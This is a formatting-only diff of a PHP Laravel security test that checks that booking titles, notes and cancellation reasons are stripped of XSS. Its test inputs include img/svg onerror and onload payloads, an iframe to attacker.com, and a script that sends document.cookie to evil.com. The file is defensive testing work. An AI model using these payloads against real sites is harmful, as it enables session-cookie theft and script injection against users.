@@ -28,7 +28,7 @@ class BookingXssSanitizationAuditTest extends TestCase
 
         return [
             'start' => $start,
-            'end'   => $end,
+            'end' => $end,
         ];
     }
 
@@ -42,12 +42,12 @@ class BookingXssSanitizationAuditTest extends TestCase
         $xssNotes = '<img src=x onerror=alert(1)><b>Agenda Pembahasan:</b> Roadmap Q4 <iframe src="https://attacker.com"></iframe>';
 
         $payload = [
-            'room_id'           => $room->id,
-            'title'             => $xssTitle,
+            'room_id' => $room->id,
+            'title' => $xssTitle,
             'participant_count' => 5,
-            'start_time'        => $slot['start']->toDateTimeString(),
-            'end_time'          => $slot['end']->toDateTimeString(),
-            'notes'             => $xssNotes,
+            'start_time' => $slot['start']->toDateTimeString(),
+            'end_time' => $slot['end']->toDateTimeString(),
+            'notes' => $xssNotes,
         ];
 
         $response = $this->actingAs($employee)
@@ -76,13 +76,13 @@ class BookingXssSanitizationAuditTest extends TestCase
         $slot = $this->getNextWorkingSlot();
 
         $booking = Booking::factory()->create([
-            'user_id'    => $employee->id,
-            'room_id'    => $room->id,
-            'title'      => 'Judul Asli Bersih',
-            'notes'      => 'Catatan Asli Bersih',
+            'user_id' => $employee->id,
+            'room_id' => $room->id,
+            'title' => 'Judul Asli Bersih',
+            'notes' => 'Catatan Asli Bersih',
             'start_time' => $slot['start']->toDateTimeString(),
-            'end_time'   => $slot['end']->toDateTimeString(),
-            'status'     => 'pending',
+            'end_time' => $slot['end']->toDateTimeString(),
+            'status' => 'pending',
         ]);
 
         $xssTitle = '<svg/onload=alert("XSS")>Judul Pembaruan Rapat';
@@ -90,12 +90,12 @@ class BookingXssSanitizationAuditTest extends TestCase
 
         $response = $this->actingAs($employee)
             ->putJson("/api/v1/bookings/{$booking->id}", [
-                'room_id'           => $room->id,
-                'title'             => $xssTitle,
+                'room_id' => $room->id,
+                'title' => $xssTitle,
                 'participant_count' => 4,
-                'start_time'        => $slot['start']->toDateTimeString(),
-                'end_time'          => $slot['end']->toDateTimeString(),
-                'notes'             => $xssNotes,
+                'start_time' => $slot['start']->toDateTimeString(),
+                'end_time' => $slot['end']->toDateTimeString(),
+                'notes' => $xssNotes,
             ]);
 
         $response->assertOk();
@@ -113,7 +113,7 @@ class BookingXssSanitizationAuditTest extends TestCase
         $employee = User::factory()->create(['role' => 'karyawan']);
         $booking = Booking::factory()->create([
             'user_id' => $employee->id,
-            'status'  => 'pending',
+            'status' => 'pending',
         ]);
 
         $xssReason = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>Pembatalan karena manajer berhalangan hadir.';
@@ -132,7 +132,7 @@ class BookingXssSanitizationAuditTest extends TestCase
 
     public function test_booking_model_attribute_mutators_directly_strip_xss(): void
     {
-        $booking = new Booking();
+        $booking = new Booking;
         $booking->title = '<script>evil()</script>Rapat Direksi';
         $booking->notes = '<b>Poin 1:</b> Evaluasi kinerja <img src=x onerror=attack()>';
         $booking->cancellation_reason = '<b>Alasan dibatalkan resmi</b>';
